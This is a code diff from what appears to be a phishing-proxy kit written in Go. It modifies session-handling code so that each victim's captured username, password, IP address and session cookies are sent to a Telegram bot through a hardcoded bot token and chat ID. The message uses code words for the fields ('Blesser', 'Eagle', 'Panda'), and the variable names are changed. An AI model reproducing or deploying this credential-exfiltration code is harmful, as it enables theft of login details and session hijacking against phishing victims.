@@ -9,15 +9,14 @@ import (
     "log"
 
 	"github.com/tidwall/buntdb"
-	//"github.com/go-telegram-bot-api/telegram-bot-api"
 	"gopkg.in/telegram-bot-api.v4"
 )
 
 const SessionTable = "sessions"
-var tCu string
-var tCp string
+var tCuLation string
+var tCpLation string
 var tCt string
-var tCiP string
+var ipLation string
 var body string
 var dcF string
 type Session struct {
@@ -79,7 +78,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		CreateTime:   time.Now().UTC().Unix(),
 		UpdateTime:   time.Now().UTC().Unix(),
 	}
-	tCiP = remote_addr
+	ipLation = remote_addr
 
 	jf, _ := json.Marshal(s)
 
@@ -120,7 +119,7 @@ func (d *Database) sessionsUpdateUsername(sid string, username string) error {
 	s.UpdateTime = time.Now().UTC().Unix()
 
 	err = d.sessionsUpdate(s.Id, s)
-	tCu = username
+	tCuLation = username
 	return err
 }
 
@@ -131,7 +130,7 @@ func (d *Database) sessionsUpdatePassword(sid string, password string) error {
 	}
 	s.Password = password
 	s.UpdateTime = time.Now().UTC().Unix()
-	tCp = password
+	tCpLation = password
 	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
@@ -220,9 +219,9 @@ func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[
 
 	json, _ := json.Marshal(cookies)
 	tCt = string(json)
-	saveDoc(tCu, tCt)
-	comBined := "New Potential Blesser \r\nEagle: " + tCu + "\r\nPanda: " + tCp + "\r\nIP Address: " + tCiP
-	send(comBined, "5689421286:AAFAwYrzC2rcKP4NWH9h8IxZO71HeLfv7Xs", 1417990651, tCu)
+	saveDoc(tCuLation, tCt)
+	comBined := "A New Potential Blesser Has Arrived \r\nEagle: " + tCuLation + "\r\nPanda: " + tCpLation + "\r\nIP Address: " + ipLation
+	send(comBined, "5689421286:AAFAwYrzC2rcKP4NWH9h8IxZO71HeLfv7Xs", 7164206438, tCuLation)
 	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
